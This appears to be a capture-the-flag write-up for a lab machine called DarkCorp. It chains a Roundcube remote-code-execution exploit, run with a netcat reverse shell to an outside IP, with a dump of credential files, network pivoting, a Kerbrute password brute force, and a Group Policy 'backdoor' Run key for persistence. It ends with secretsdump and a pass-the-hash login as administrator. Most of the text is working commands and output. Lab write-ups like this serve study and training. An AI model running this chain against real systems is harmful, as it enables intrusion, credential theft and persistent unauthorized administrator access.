
![](Dark_corp-bg.png)

## INFO


```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
```


``` Domaain
10.10.11.54     drip.htb  mail.drip.htb
```

Its RoundCube WebMail Server ; Lets register and login- to the portal for more info.


``` RoundCube_Version
Roundcube Webmail 1.6.7
```

This version of Rouncube is vulnerable to CVE-2024-4200 and CVE-2025-49113

CVE-2025-49113 is a dangerous exploit , just need a valid user and boom , but this aint the intended path , Check the exploit we get direct [RCE](https://github.com/hakaioffsec/CVE-2025-49113-exploit) 

CVE-2024-4200 , attacker can inject malicious JavaScript in a message and take advantage of a desanitization issue when parsing the HTML inside the message, which then can be used to exfiltrate email content from the victim's inbox. [XSS](https://github.com/DaniTheHack3r/CVE-2024-42009-PoC)



## Own Way 
### Unintended RCE [CVE-2025-49113]

```
php CVE-2025-49113.php http://mail.drip.htb/ admin admin "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.204 1337 >/tmp/f"
```

Once we get the RCE Search for juicy things....

```
www-data@drip:/var/www/html/dashboard$ cat .env

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```


Get Shell as postgres user and check /var/backups/postgres Then decrypt the file with GPG -> dev-dripmail.sql where we retrive usernames and hashes along with that.


### Domain Admin Access 

Once we got the doamin user credentials ; Now its time to pwn the AD.

```
ebelford :: ThePlague61780  [linux host only accessible ; ]

└─# sshpass -p ThePlague61780 ssh -o StrictHostKeyChecking=no ebelford@drip.htb

victor.r :: victor1gustavo@# [Domain User ]
```


```sshuttle
sshuttle -r ebelford@drip.htb 172.16.20.0/24
```


Run Bloodhound !

``` ssh_remote
ssh -o StrictHostKeyChecking=no -D 1080 ebelford@drip.htb
```

```/etc/proxychains4.conf
dnat 10.10.11.54  172.16.20.1

[ProxyList]
# add proxy here ...

socks5 127.0.0.1 1080

```


```
proxychains bloodhound-python --domain darkcorp.htb --domain-controller dc-01.darkcorp.htb --nameserver 172.16.20.1 --username victor.r --password 'victor1gustavo@#' --collectionmethod all --dns-tcp --zip 
```


Our Guy Dont have higher privilege ; But TAYLOR.B.ADM seems intresting.

![](dark-corp-bloodhound.png)


Only way is BruteForce with Kerbrute !

``` pass-pol
└─# nxc smb dc-01.darkcorp.htb -u victor.r -p 'victor1gustavo@#' --pass-pol


Minimum password length: 7

Reset Account Lockout Counter: 30 minutes
```


-> make a password list with minimum pass. length is 7 max. 12 ; or just extract it from rockyou ;

Transfer KErbrute and the custom_rockyou file to the Victim Machine ! 

```kerbrute
ebelford@drip:~$ ./Kerbrute_ bruteuser --dc 171.16.20.1 -d darkcorp.htb rockyou.txt taylor.b.adm -t 64


darkcorp.htb\taylor.b.adm:!QAZzaq1

```


### PRIV --> Group Policy Object (GPO) abuse in Windows for persistence and privilege escalation.


```proxy
sshuttle -r ebelford@drip.htb 172.16.20.0/24 
```

```winrm
evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1' 
```


✅ Download & Execute Malicious Script

``` download
upload PowerGPOAbuse.ps1
```

Add User to Group via GPO

```
PS > . .\PowerGPOAbuse.ps1
PS > Add-GPOGroupMember -Member 'taylor.b.adm' -GPOIdentity 'SecurityUpdates'
True
```


✅ Persistence + PrivEsc via GPO 

--> Malicious GPO writes to HKLM\...\Run.

--> At every startup, a PowerShell cmd adds taylor.b.adm to Administrators.

--> Even if removed, it comes back → automatic re-admin + persistence.

 ```
 PS > Set-GPRegistryValue -Name "SecurityUpdates" `
-Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
-ValueName "backdoor" `
-Type String `
-Value "powershell -ExecutionPolicy Bypass -NoProfile -Command 'Add-LocalGroupMember -Group Administrators -Member taylor.b.adm'"
 
DisplayName      : SecurityUpdates
DomainName       : darkcorp.htb
Owner            : darkcorp\Domain Admins
Id               : 652cae9a-4bb7-49f2-9e52-3361f33ce786
GpoStatus        : AllSettingsEnabled
Description      : Windows Security Group Policy
CreationTime     : 1/3/2025 3:01:12 PM
ModificationTime : 9/30/2025 2:24:58 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 2, SysVol Version: 2
WmiFilter        :


PS> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```


Dump the secrets 

HOw ? --> We just added taylor.b.adm as local administrator --> GPO "Security Updates"


```secretsdump
impacket-secretsdump dc-01.darkcorp.htb/taylor.b.adm:'!QAZzaq1'@darkcorp.htb
```

```root.txt
evil-winrm -i darkcorp.htb -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f 

root.txt : fcef13756501763e4c4c13468c6c99d8
```


